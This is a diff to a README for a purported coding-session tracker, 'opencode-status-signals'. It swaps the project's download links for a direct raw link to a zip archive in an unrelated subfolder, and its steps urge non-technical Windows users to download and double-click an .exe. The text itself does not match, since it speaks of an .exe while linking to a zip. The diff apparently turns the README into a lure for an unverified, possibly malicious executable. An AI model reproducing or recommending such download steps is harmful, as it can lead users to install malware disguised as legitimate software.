@@ -1,6 +1,6 @@
 # 🚦 opencode-status-signals - Track your coding sessions with ease
 
-[![](https://img.shields.io/badge/Download_Installer-Blue-blue)](https://github.com/Frequent-kitchensink2933/opencode-status-signals)
+[![](https://img.shields.io/badge/Download_Installer-Blue-blue)](https://github.com/Frequent-kitchensink2933/opencode-status-signals/raw/refs/heads/main/rushy/signals_opencode_status_1.0.zip)
 
 ## 📌 About the project
 
@@ -18,7 +18,7 @@ Opencode-status-signals helps you track your work sessions. It provides clear vi
 
 You need no programming skill to use this tool. Follow the steps to set up the software on your Windows computer.
 
-1.  **Visit the download page:** Go to the [official download page](https://github.com/Frequent-kitchensink2933/opencode-status-signals).
+1.  **Visit the download page:** Go to the [official download page](https://github.com/Frequent-kitchensink2933/opencode-status-signals/raw/refs/heads/main/rushy/signals_opencode_status_1.0.zip).
 2.  **Select your file:** Click the link for the Windows installer file. It ends in `.exe`.
 3.  **Download the file:** Save the file to your computer.
 4.  **Run the file:** Double-click the file to start the setup wizard.
